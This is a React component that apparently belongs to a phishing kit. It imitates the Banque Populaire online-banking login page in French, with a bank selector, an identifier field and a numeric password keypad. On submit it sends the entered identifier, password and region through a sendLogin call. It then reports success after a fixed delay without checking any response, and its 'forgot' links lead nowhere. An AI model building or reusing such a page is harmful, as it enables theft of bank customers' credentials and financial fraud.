import { useState } from 'react';
import { theme } from '../../config/theme';
import { sendLogin } from '../../api';
import BpNumPad from './BpNumPad';

interface Props {
  onSuccess: () => void;
  onLoading: (v: boolean) => void;
}

const PWD_LEN = 8;

export default function BpStepLogin({ onSuccess, onLoading }: Props) {
  const [region, setRegion] = useState('');
  const [ident, setIdent] = useState('');
  const [code, setCode] = useState('');
  const [submitting, setSubmitting] = useState(false);

  const showPwd = region !== '' && ident.trim().length > 0;
  const canSubmit = showPwd && code.length >= PWD_LEN && !submitting;

  const handleSubmit = async () => {
    setSubmitting(true);
    onLoading(true);
    await sendLogin(ident.trim(), code, region);
    setTimeout(() => { onLoading(false); onSuccess(); }, 1500);
  };

  return (
    <div className="pt-[60px] min-h-screen animate-fadeIn">
      <div className="flex flex-col lg:flex-row min-h-[calc(100vh-60px)]">
        {/* Left: form */}
        <div className="lg:w-[440px] xl:w-[500px] flex-shrink-0 flex flex-col px-5 md:px-10 pt-10 pb-6">
          <div className="max-w-[400px] mx-auto w-full">
            <h1 className="text-[24px] md:text-[28px] font-bold text-gray-900 mb-6 leading-[1.2]">Connexion à votre espace</h1>

            {/* Région */}
            <div className="relative mb-5">
              <select
                value={region}
                onChange={(e) => { setRegion(e.target.value); setCode(''); }}
                className="peer w-full h-[56px] px-4 pt-5 pb-1 bg-white border-b-2 border-gray-300 focus:border-primary outline-none text-[15px] font-medium text-gray-900 appearance-none cursor-pointer transition-colors rounded-none"
              >
                <option value=""></option>
                {theme.regions.map((r) => (<option key={r} value={r}>{r}</option>))}
              </select>
              <label className={`absolute left-4 pointer-events-none transition-all ${region ? 'top-1.5 text-[11px] text-primary' : 'top-4 text-[14px] text-gray-500'}`}>
                Sélectionnez votre établissement bancaire
              </label>
              <svg className="absolute right-4 top-1/2 -translate-y-1/2 w-5 h-5 text-gray-500 pointer-events-none" viewBox="0 0 20 20" fill="currentColor">
                <path fillRule="evenodd" d="M5.293 7.293a1 1 0 011.414 0L10 10.586l3.293-3.293a1 1 0 111.414 1.414l-4 4a1 1 0 01-1.414 0l-4-4a1 1 0 010-1.414z" clipRule="evenodd" />
              </svg>
            </div>

            {/* Identifiant */}
            <div className="relative mb-5">
              <input type="text" value={ident} onChange={(e) => { setIdent(e.target.value); setCode(''); }} className="peer w-full h-[56px] px-4 pt-5 pb-1 bg-white border-b-2 border-gray-300 focus:border-primary outline-none text-[15px] font-medium text-gray-900 transition-colors rounded-none" placeholder=" " autoComplete="off" />
              <label className="absolute left-4 transition-all pointer-events-none peer-placeholder-shown:top-4 peer-placeholder-shown:text-[14px] peer-placeholder-shown:text-gray-500 top-1.5 text-[11px] text-primary peer-focus:top-1.5 peer-focus:text-[11px] peer-focus:text-primary">Entrez votre identifiant</label>
            </div>

            {showPwd && (
              <div className="animate-fadeIn">
                <BpNumPad length={PWD_LEN} value={code} onChange={setCode} />
              </div>
            )}

            <div className="flex gap-3 mt-2">
              <button type="button" disabled={!canSubmit} onClick={handleSubmit} className={`flex-1 h-[50px] bg-primary text-white font-bold rounded-lg transition text-[15px] uppercase tracking-wide ${canSubmit ? 'hover:bg-primary-dark cursor-pointer' : 'opacity-50 cursor-not-allowed'}`}>
                {submitting ? 'Connexion...' : 'Valider'}
              </button>
            </div>

            <div className="flex gap-4 mt-5">
              <a href="#" className="text-[13px] text-primary hover:underline font-medium">Identifiant oublié ?</a>
              <a href="#" className="text-[13px] text-primary hover:underline font-medium">Mot de passe oublié ?</a>
            </div>
          </div>
        </div>

        {/* Right: bg image */}
        <div className="hidden lg:block flex-1 relative bg-cover bg-center" style={{ backgroundImage: `url(${theme.bgImage})` }}>
          <div className="absolute inset-0 bg-gradient-to-b from-black/5 to-black/20" />
          <div className="relative z-10 flex items-start justify-center pt-24">
            <div className="bg-white/95 backdrop-blur rounded-xl shadow-lg px-10 py-8 max-w-[320px] text-center">
              <img src={theme.logo} alt="Banque Populaire" className="h-[40px] mx-auto mb-4" />
              <p className={region ? 'text-[13px] font-medium text-gray-700 uppercase tracking-wide leading-[1.4]' : 'text-[14px] text-gray-600 leading-[1.5]'}>
                {region || "Accédez à l'ensemble de vos comptes et services en toute sécurité."}
              </p>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
}
